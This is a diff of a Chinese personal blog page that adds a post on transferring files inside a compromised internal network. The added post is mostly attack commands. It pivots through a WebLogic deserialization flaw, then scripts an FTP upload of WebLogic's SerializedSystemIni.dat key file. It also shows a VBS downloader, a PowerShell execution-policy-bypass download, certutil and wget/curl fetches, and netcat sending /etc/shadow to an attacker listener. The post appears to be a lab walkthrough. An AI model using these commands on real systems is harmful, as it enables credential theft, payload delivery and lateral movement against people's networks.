@@ -112,17 +112,25 @@
 
 
 
-  <meta name="description" content="growing up">
+  <meta name="description" content="文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网文件传输">
 <meta property="og:url" content="http://yoursite.com/2018/12/03/内网文件传输/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="growing up">
+<meta property="og:description" content="文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-03T07:15:07.049Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtss5qpy1j30c208tdg0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtst1385ij30in0c474q.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtstvlpcgj30hi08owex.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsufxctmj30jw0800tc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsvspt2zj30np0czdhb.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsxb16y4j30ko0cywfm.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsylae6dj30qc0egwfl.jpg">
+<meta property="og:updated_time" content="2018-12-03T11:55:45.471Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网文件传输">
-<meta name="twitter:description" content="growing up">
+<meta name="twitter:description" content="文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtss5qpy1j30c208tdg0.jpg">
 
 
 
@@ -396,7 +404,7 @@
                 
               
 
-              <time title="创建时间：2018-12-03 14:57:38 / 修改时间：15:15:07" itemprop="dateCreated datePublished" datetime="2018-12-03T14:57:38+08:00">2018-12-03</time>
+              <time title="创建时间：2018-12-03 14:57:38 / 修改时间：19:55:45" itemprop="dateCreated datePublished" datetime="2018-12-03T14:57:38+08:00">2018-12-03</time>
             
 
             
@@ -459,7 +467,51 @@
       
 
       
-        
+        <h1 id="文件传输方法："><a href="#文件传输方法：" class="headerlink" title="文件传输方法："></a>文件传输方法：</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>ftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传）</p>
+<h4 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h4><p>现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及</p>
+<p>公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。</p>
+<p>实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。</p>
+<p>开启FTP服务：<br><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtss5qpy1j30c208tdg0.jpg" alt=""></p>
+<p>使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机</p>
+<p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtst1385ij30in0c474q.jpg" alt=""></p>
+<pre><code>1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt         //登陆FTP服务器
+2、echo guoxiang&gt;&gt;1.txt                              //用户名
+3、echo password&gt;&gt;1.txt                              //密码
+4、echo bin&gt;&gt;1.txt                              //开始
+5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt                      //下载程序
+6、echo bye&gt;&gt;1.txt                              //关闭FTP服务器
+</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtstvlpcgj30hi08owex.jpg" alt=""></p>
+<p>然后执行ftp -s:1.txt</p>
+<p>发现在ftp主机中出现了上传的文件。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsufxctmj30jw0800tc.jpg" alt=""></p>
+<p>用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。</p>
+<h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><p>echo 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置</p>
+<pre><code>echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbs
+
+cscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exe
+
+putty.exe
+</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsvspt2zj30np0czdhb.jpg" alt=""></p>
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>powershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置）</code></p>
+<pre><code> powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;)
+
+putty1.exe
+</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsxb16y4j30ko0cywfm.jpg" alt=""></p>
+<h3 id="certain"><a href="#certain" class="headerlink" title="certain"></a>certain</h3><p><code>certutil.exe -urlcache -split -f 远程文件位置</code></p>
+<pre><code>certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe
+
+certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete        //删除缓存
+
+putty.exe
+</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>攻击端监听端口，并重定向：</p>
+<pre><code>nc -nvv -lp 4455 &gt; shaodw.txt
+</code></pre><p>目标机将文件内容回传：</p>
+<pre><code>nc 192.168.111.251 4455 &lt; /etc/shadow
+</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsylae6dj30qc0egwfl.jpg" alt=""></p>
+<h3 id="Wget（下载）"><a href="#Wget（下载）" class="headerlink" title="Wget（下载）"></a>Wget（下载）</h3><pre><code>wget http://192.168.111.1:8080/test/putty.exe
+</code></pre><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。</p>
+<pre><code>curl -O http://192.168.111.1:8080/test/putty.exe
+</code></pre>
       
     </div>
 
@@ -546,8 +598,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -564,7 +625,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -591,7 +652,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">7</span>
+                      
+                    
+                    <span class="site-state-item-count">8</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -640,6 +703,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件传输方法："><span class="nav-number">1.</span> <span class="nav-text">文件传输方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows"><span class="nav-number">1.1.</span> <span class="nav-text">windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FTP"><span class="nav-number">1.1.1.</span> <span class="nav-text">FTP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实践："><span class="nav-number">1.1.1.1.</span> <span class="nav-text">实践：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VBS"><span class="nav-number">1.1.2.</span> <span class="nav-text">VBS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell"><span class="nav-number">1.1.3.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#certain"><span class="nav-number">1.1.4.</span> <span class="nav-text">certain</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">1.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Wget（下载）"><span class="nav-number">1.2.1.</span> <span class="nav-text">Wget（下载）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl"><span class="nav-number">1.2.2.</span> <span class="nav-text">curl</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
